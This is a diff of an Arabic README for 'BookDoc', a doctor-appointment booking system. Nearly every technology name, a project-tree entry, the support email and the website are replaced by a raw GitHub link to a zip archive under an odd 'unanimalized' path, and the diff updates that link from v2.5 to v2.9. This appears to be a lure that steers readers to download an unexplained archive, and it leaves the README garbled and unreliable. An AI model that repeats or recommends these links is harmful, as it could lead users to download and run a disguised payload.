@@ -7,7 +7,7 @@
 BookDoc هو نظام متكامل لحجز مواعيد الأطباء يتكون من ثلاثة تطبيقات رئيسية:
 
 ### 1. تطبيق الموبايل للمرضى 📱
-- **التقنية**: https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip (PWA)
+- **التقنية**: https://raw.githubusercontent.com/ab20032002/bookdoc1/main/unanimalized/bookdoc_v2.9.zip (PWA)
 - **المميزات**:
   - تسجيل الدخول وإنشاء الحساب
   - البحث عن الأطباء حسب التخصص والموقع
@@ -18,7 +18,7 @@ BookDoc هو نظام متكامل لحجز مواعيد الأطباء يتكو
   - دعم اللغتين العربية والإنجليزية
 
 ### 2. لوحة تحكم الأطباء 💻
-- **التقنية**: https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip
+- **التقنية**: https://raw.githubusercontent.com/ab20032002/bookdoc1/main/unanimalized/bookdoc_v2.9.zip
 - **المميزات**:
   - لوحة تحكم شاملة
   - إدارة الحجوزات
@@ -28,7 +28,7 @@ BookDoc هو نظام متكامل لحجز مواعيد الأطباء يتكو
   - إحصائيات مفصلة
 
 ### 3. لوحة تحكم المدير 🛠️
-- **التقنية**: https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip
+- **التقنية**: https://raw.githubusercontent.com/ab20032002/bookdoc1/main/unanimalized/bookdoc_v2.9.zip
 - **المميزات**:
   - إحصائيات شاملة
   - إدارة الأطباء والتخصصات
@@ -38,7 +38,7 @@ BookDoc هو نظام متكامل لحجز مواعيد الأطباء يتكو
 ## التقنيات المستخدمة
 
 ### Frontend
-- **https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip** - مكتبة JavaScript لبناء واجهات المستخدم
+- **https://raw.githubusercontent.com/ab20032002/bookdoc1/main/unanimalized/bookdoc_v2.9.zip** - مكتبة JavaScript لبناء واجهات المستخدم
 - **React Router** - للتنقل بين الصفحات
 - **React Query** - لإدارة حالة البيانات
 - **React Hook Form** - لإدارة النماذج
@@ -48,14 +48,14 @@ BookDoc هو نظام متكامل لحجز مواعيد الأطباء يتكو
 - **Framer Motion** - للحركات والتأثيرات
 
 ### Backend (مخطط)
-- **https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip + Express** - خادم API
+- **https://raw.githubusercontent.com/ab20032002/bookdoc1/main/unanimalized/bookdoc_v2.9.zip + Express** - خادم API
 - **MongoDB/PostgreSQL** - قاعدة البيانات
 - **JWT** - للمصادقة
 - **Firebase Cloud Messaging** - للإشعارات
 - **Multer + Cloudinary** - لرفع الملفات
 
 ### ميزات إضافية
-- **QR Code** - https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip
+- **QR Code** - https://raw.githubusercontent.com/ab20032002/bookdoc1/main/unanimalized/bookdoc_v2.9.zip
 - **PDF** - jsPDF
 - **الترجمة** - i18next
 - **PWA** - تطبيق ويب تقدمي
@@ -73,7 +73,7 @@ bookdoc-project/
 │   │   ├── services/       # خدمات API
 │   │   ├── locales/        # ملفات الترجمة
 │   │   └── ...
-│   ├── https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip
+│   ├── https://raw.githubusercontent.com/ab20032002/bookdoc1/main/unanimalized/bookdoc_v2.9.zip
 │   └── ...
 ├── doctor-dashboard/        # لوحة تحكم الأطباء
 │   ├── public/
@@ -84,7 +84,7 @@ bookdoc-project/
 │   │   ├── services/
 │   │   ├── locales/
 │   │   └── ...
-│   ├── https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip
+│   ├── https://raw.githubusercontent.com/ab20032002/bookdoc1/main/unanimalized/bookdoc_v2.9.zip
 │   └── ...
 ├── admin-dashboard/         # لوحة تحكم المدير (قيد التطوير)
 ├── backend/                # API والخادم (قيد التطوير)
@@ -96,7 +96,7 @@ bookdoc-project/
 
 ### 1. تثبيت المتطلبات
 ```bash
-# تثبيت https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip (الإصدار 16 أو أحدث)
+# تثبيت https://raw.githubusercontent.com/ab20032002/bookdoc1/main/unanimalized/bookdoc_v2.9.zip (الإصدار 16 أو أحدث)
 # تثبيت npm أو yarn
 
 # تثبيت جميع التبعيات
@@ -252,9 +252,9 @@ npm run build
 
 ## الدعم والمساعدة
 
-- **البريد الإلكتروني**: https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip
+- **البريد الإلكتروني**: https://raw.githubusercontent.com/ab20032002/bookdoc1/main/unanimalized/bookdoc_v2.9.zip
 - **الهاتف**: +966 50 123 4567
-- **الموقع**: https://github.com/ab20032002/bookdoc1/raw/refs/heads/main/unanimalized/bookdoc_v2.5.zip
+- **الموقع**: https://raw.githubusercontent.com/ab20032002/bookdoc1/main/unanimalized/bookdoc_v2.9.zip
 
 ---
 
